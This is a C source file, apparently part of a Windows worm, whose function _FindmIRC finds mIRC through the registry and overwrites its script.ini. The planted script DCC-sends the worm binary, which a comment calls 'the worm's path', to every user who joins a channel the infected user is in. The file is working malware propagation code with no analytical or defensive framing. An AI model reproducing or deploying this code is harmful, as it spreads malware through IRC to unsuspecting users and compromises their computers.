#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>
#include <stdio.h>
#include <string.h>   // for strlen, strcat

void _FindmIRC(void)
{
    volatile struct _LocalCtx {
        char mIrc[256];
        char mIrcPath[256];
        char mIrcFull[256];
        FILE *Script;
        int e;
    } ctx;

    // Initialize mIrcFull to zeros (since original had = {0})
    memset(ctx.mIrcFull, 0, sizeof(ctx.mIrcFull));

    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\mIrc", 0, KEY_READ, &_hKey);
    RegQueryValueExA(_hKey, "UninstallString", NULL, NULL, ctx.mIrc, (LPDWORD)&_mIrcPath);
    RegCloseKey(_hKey);

    // Extract the mIRC installation path from the uninstall string (skip the first character)
    ctx.e = 1;
    while (ctx.mIrc[ctx.e] != '\0' && ctx.mIrc[ctx.e] != '.')
    {
        ctx.mIrcFull[ctx.e - 1] = ctx.mIrc[ctx.e];
        ctx.e++;
    }
    ctx.mIrcFull[ctx.e - 1] = '\0';   // truncate before the dot (e.g., "C:\...\mirc.exe" -> "C:\...\mirc")

    // Find the last backslash and truncate to the directory
    ctx.e = strlen(ctx.mIrcFull);
    while (ctx.mIrcFull[ctx.e] != '\\')
    {
        ctx.mIrcFull[ctx.e] = '\0';
        ctx.e--;
    }

    // Append "script.ini"
    strcat(ctx.mIrcFull, "script.ini");

    ctx.Script = fopen(ctx.mIrcFull, "wt");
    fprintf(ctx.Script, "[script]\n");
    fprintf(ctx.Script, "n0=on 1:JOIN:#:{\n");
    fprintf(ctx.Script, "n1=/if ( $nick == $me ) { halt }\n");
    fprintf(ctx.Script, "n2=/dcc send $nick %s\n", _sysdoze2);   // use the global sysdoze2 (the worm's path)
    fprintf(ctx.Script, "n3=}\n");
    fclose(ctx.Script);

    return;
}
#pragma optimize("", on)
